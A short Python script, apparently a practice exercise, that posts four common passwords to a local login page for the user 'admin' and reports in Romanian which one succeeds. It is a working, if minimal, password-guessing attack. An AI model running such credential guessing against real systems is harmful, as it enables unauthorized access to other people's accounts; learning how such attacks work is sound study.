import requests

url = "http://127.0.0.1:5000/login"

passwords = ["admin", "admin1", "123", "1234"]

for p in passwords:
    data = {
        "user": "admin",
        "password": p
    }
    
    r = requests.post(url,data=data)

    if "Login succesful" in r.text:
        print(f"Am gasit parola: {p}")
        break
    else:
        print(f"Incercat: {p}")